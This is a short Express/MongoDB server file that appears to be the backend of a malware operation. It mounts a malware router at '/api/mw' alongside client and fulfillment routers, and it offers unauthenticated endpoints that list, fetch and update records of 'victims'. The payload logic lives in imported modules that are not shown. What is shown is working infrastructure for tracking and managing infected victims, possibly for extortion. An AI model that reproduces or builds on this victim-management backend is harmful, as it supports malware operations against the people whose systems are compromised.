import express, { Router } from "express";
import dotenv from "dotenv";
import { mongoose } from "mongoose";
dotenv.config();
const PORT = process.env.PORT || process.env.BACKEND_PORT || 3001;
const app = express();

import Victim from './models/victimModel.js';
import Request from './models/requestModel.js';

import clientRouter from './api/client.js';
import malwareRouter from './api/malware.js';
import fulfillmentRouter from './api/fulfillment.js';

mongoose.connect(process.env.MONGO_URI, {} ).then(() => {
    console.log('MongoDB connected');
}).catch((err) => {
    console.log(err);
});

import bodyParser from "body-parser"
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.use('/api/client', clientRouter);
app.use('/api/mw', malwareRouter);
app.use('/api/fulfill', fulfillmentRouter);

app.get('/victims', (req, res) => {
    Victim.find().then((docs) => {
        res.json(docs);
    }).catch((err) => {
        res.status(400).json(err);
    });
});


app.get('/victim/:id', (req, res)=>{
    const id = req.params.id;
    Victim.findOne({id: id}).then((doc) => {
        res.json(doc);
    }).catch((err) => {
        res.status(400).json(err);
    });
})

app.post('/updateVictim/:id', (req, res) => {
    const id = req.params.id;
    const update = req.body;
    Victim.findOneAndUpdate({id: id}, update).then((doc) => {
        res.json(doc);
    }).catch((err) => {
        res.status(400).json(err);
    });
})

app.get('/health', (req, res) => {
    res.send('OK');
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});